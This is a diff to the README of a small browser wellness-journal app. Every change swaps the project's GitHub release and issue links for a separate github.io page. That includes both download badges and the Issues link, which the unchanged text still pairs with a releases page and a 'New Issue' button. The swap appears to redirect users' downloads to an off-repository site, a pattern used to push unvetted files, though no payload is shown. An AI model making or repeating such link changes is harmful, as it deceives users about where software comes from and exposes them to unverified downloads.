@@ -1,6 +1,6 @@
 # 📓 apex-wellness-journal-web - Your Personal Wellness Journal in a Browser
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/timh1203/apex-wellness-journal-web/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://timh1203.github.io)
 
 apex-wellness-journal-web is a small, self-contained web app for tracking health notes, wellness observations, and personal reflections. You run it directly in your browser. No installation required. No account needed.
 
@@ -29,7 +29,7 @@ Running the app on your own computer gives you full control. Your data stays loc
 
 Click the button below to go to the releases page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-0366d6?style=for-the-badge&logo=github)](https://github.com/timh1203/apex-wellness-journal-web/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-0366d6?style=for-the-badge&logo=github)](https://timh1203.github.io)
 
 **Step 2: Find the Latest Release**
 
@@ -157,7 +157,7 @@ You only need `index.html` to use the app. The other files are loaded automatica
 If you run into a problem:
 
 1. Read the Troubleshooting section above.
-2. Visit the repository's Issues page: `https://github.com/timh1203/apex-wellness-journal-web/issues`
+2. Visit the repository's Issues page: `https://timh1203.github.io`
 3. Click "New Issue" and describe your problem. Include your operating system and browser version.
 
 We respond to issues within a few days. Do not include personal data in your issue report.
